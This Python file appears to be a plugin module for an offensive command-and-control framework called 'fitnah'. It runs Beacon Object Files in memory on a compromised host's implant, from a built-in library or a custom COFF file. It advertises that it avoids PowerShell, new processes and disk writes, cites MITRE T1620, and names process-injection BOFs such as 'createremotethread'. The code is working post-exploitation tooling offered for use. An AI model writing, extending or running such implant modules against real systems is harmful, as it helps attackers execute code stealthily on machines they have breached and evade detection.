"""execution/bof_exec — Beacon Object File (BOF) in-process execution. MITRE T1620

Loads a COFF .o from the operator's BOF library or a custom file, executes it
in-process on the implant via BofExecute() — no PowerShell, no new process,
no disk write. Fully compatible with TrustedSec and Cobalt Strike BOF format.
"""
import base64
from pathlib import Path
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class BofExec(BasePlugin):
    NAME        = "bof_exec"
    DESCRIPTION = "Execute a BOF (COFF .o file) in-process on the implant. Uses BofExecute() — no PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1620"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("bof",      str, required=False, default="",
              help="BOF name from fitnah/bofs/ library (e.g. 'whoami', 'createremotethread')"),
        Param("bof_path", str, required=False, default="",
              help="Local path to custom .x64.o COFF file"),
        Param("args_b64", str, required=False, default="",
              help="Base64-encoded packed BOF argument buffer (BOF args_pack format)"),
        Param("timeout",  int, required=False, default=60,
              help="Seconds to wait for BOF output (default 60)"),
    )

    @mitre("T1620")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        bof_name  = params.get("bof", "").strip()
        bof_path  = params.get("bof_path", "").strip()
        args_b64  = params.get("args_b64", "").strip()
        timeout   = int(params.get("timeout", 60))

        if bof_name and not bof_path:
            # Dispatch named BOF from library
            r = ctx.bof(bof_name, args_b64=args_b64, timeout=timeout)
        elif bof_path:
            p = Path(bof_path)
            if not p.exists():
                return ModuleResult.err(f"BOF file not found: {bof_path}")
            r = ctx.bof_raw(p.read_bytes(), args_b64=args_b64, timeout=timeout)
        else:
            return ModuleResult.err("Provide bof (library name) or bof_path (custom .o file)")

        if r["status"] != "ok":
            return ModuleResult.err(f"BOF execution failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
